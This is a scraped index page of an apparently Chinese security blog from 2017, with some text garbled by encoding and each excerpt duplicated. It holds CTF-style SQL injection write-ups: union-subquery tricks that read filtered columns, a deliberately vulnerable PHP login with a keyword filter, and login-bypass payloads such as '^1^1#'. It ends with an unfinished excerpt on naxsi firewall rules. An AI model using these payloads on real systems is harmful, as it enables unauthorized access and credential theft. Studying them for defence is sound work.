		<div class="date">post @ 2017-11-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQLæ³¨å…¥ä¹‹è¿‡æ»¤åˆ—ågetæ•°æ®/</a> </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	

	</div>
  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQLæ³¨å…¥ä¹‹è¿‡æ»¤åˆ—ågetæ•°æ®/</a> </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	
	</div>
  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/23/order-by-blind.html" >åŸºäºorder byçš„ç›²æ³¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>æºä»£ç :</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $dbhost &#x3D; &quot;172.19.0.2&quot;;
  $dbuser &#x3D; &quot;root&quot;;
  $dbpass &#x3D; &quot;root&quot;;
  $db &#x3D; &quot;vul&quot;;
  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
  mysqli_set_charset($conn,&quot;utf8&quot;);
 
  &#x2F;* sql
 
     create  table &#96;admin&#96; (
        &#96;id&#96; int(10) not null primary key auto_increment,
        &#96;username&#96; varchar(20) not null ,
        &#96;password&#96; varchar(32) not null
     );
  *&#x2F;
function   filter($str)&#123;
      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
      if(preg_match($filterlist,strtolower($str)))&#123;
        die(&quot;illegal input!&quot;);
      &#125;
      return $str;
  &#125;
$username &#x3D; isset($_POST[&#39;username&#39;])?
filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
$password &#x3D; isset($_POST[&#39;password&#39;])?
filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
$sql &#x3D; &quot;select * from admin where  username &#x3D;
 &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
 
$res &#x3D; $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0)&#123;
  $row &#x3D; $res -&gt; fetch_assoc();
  if($row[&#39;id&#39;])&#123;
     echo $row[&#39;username&#39;];
  &#125;
&#125;else&#123;
   echo &quot;The content in the password column is the &quot;;
&#125;
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ä¸Šé¢è¿™ä¸ªæºä»£ç é‡Œé¢ï¼Œè¦é¦–å…ˆçŒœè§£å‡ºusernameçš„å€¼ï¼Œæ–‡ç« é‡Œé¢ç»™çš„payloadæ˜¯</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶å®ä¸Šé¢çš„payloadåˆçœ‹æ˜¯ä¸å¤ªæ‡‚çš„ï¼Œæ‰æƒ³èµ·æ¥mysqlé‡Œé¢å¼±ç±»å‹è½¬æ¢çš„é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="/2017/11/23/order-by-blind/2.png"></p>
<p>å°±æ˜¯sqlè¯­å¥æŸ¥è¯¢å¦‚æœusernameæ˜¯0çš„è¯ï¼Œæ‰€æœ‰ç»“æœå°±å‡ºæ¥äº†ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªusernameå˜æˆ0ï¼Œä¸Šé¢çš„è¯­å¥éƒ½å¯ä»¥åšåˆ°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
select * from admin where username&#x3D;&#39;&#39;&#x2F;2
select * from admin where username&#x3D;&#39;&#39;^1^1
select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åæ˜¯åŸºäºorder byçš„ç›²æ³¨ï¼š</p>
<p>é¦–å…ˆæ˜¯åŸºæœ¬çŸ¥è¯†:</p>
	

	</div>
  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>æºä»£ç :</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $dbhost &#x3D; &quot;172.19.0.2&quot;;
  $dbuser &#x3D; &quot;root&quot;;
  $dbpass &#x3D; &quot;root&quot;;
  $db &#x3D; &quot;vul&quot;;
  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
  mysqli_set_charset($conn,&quot;utf8&quot;);
 
  &#x2F;* sql
 
     create  table &#96;admin&#96; (
        &#96;id&#96; int(10) not null primary key auto_increment,
        &#96;username&#96; varchar(20) not null ,
        &#96;password&#96; varchar(32) not null
     );
  *&#x2F;
function   filter($str)&#123;
      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
      if(preg_match($filterlist,strtolower($str)))&#123;
        die(&quot;illegal input!&quot;);
      &#125;
      return $str;
  &#125;
$username &#x3D; isset($_POST[&#39;username&#39;])?
filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
$password &#x3D; isset($_POST[&#39;password&#39;])?
filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
$sql &#x3D; &quot;select * from admin where  username &#x3D;
 &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
 
$res &#x3D; $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0)&#123;
  $row &#x3D; $res -&gt; fetch_assoc();
  if($row[&#39;id&#39;])&#123;
     echo $row[&#39;username&#39;];
  &#125;
&#125;else&#123;
   echo &quot;The content in the password column is the &quot;;
&#125;
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ä¸Šé¢è¿™ä¸ªæºä»£ç é‡Œé¢ï¼Œè¦é¦–å…ˆçŒœè§£å‡ºusernameçš„å€¼ï¼Œæ–‡ç« é‡Œé¢ç»™çš„payloadæ˜¯</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶å®ä¸Šé¢çš„payloadåˆçœ‹æ˜¯ä¸å¤ªæ‡‚çš„ï¼Œæ‰æƒ³èµ·æ¥mysqlé‡Œé¢å¼±ç±»å‹è½¬æ¢çš„é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="/2017/11/23/order-by-blind/2.png"></p>
<p>å°±æ˜¯sqlè¯­å¥æŸ¥è¯¢å¦‚æœusernameæ˜¯0çš„è¯ï¼Œæ‰€æœ‰ç»“æœå°±å‡ºæ¥äº†ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªusernameå˜æˆ0ï¼Œä¸Šé¢çš„è¯­å¥éƒ½å¯ä»¥åšåˆ°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
select * from admin where username&#x3D;&#39;&#39;&#x2F;2
select * from admin where username&#x3D;&#39;&#39;^1^1
select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åæ˜¯åŸºäºorder byçš„ç›²æ³¨ï¼š</p>
<p>é¦–å…ˆæ˜¯åŸºæœ¬çŸ¥è¯†:</p>
	
	</div>
  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/02/naxsi.html" >naxsiçš„è§„åˆ™</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>MainRule: å®šä¹‰æ£€æµ‹çš„è§„åˆ™å’Œåˆ†æ•°</li>
<li>BasicRule: å®šä¹‰MainRuleçš„ç™½åå•</li>
<li>CheckRule: å®šä¹‰å½“åˆ†å€¼è¾¾åˆ°é˜ˆå€¼é‡‡å–çš„åŠ¨ä½œ</li>
</ul>
<h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>CheckrulesæŒ‡ä»¤æœ‰å››ç§åŠ¨ä½œï¼š</p>
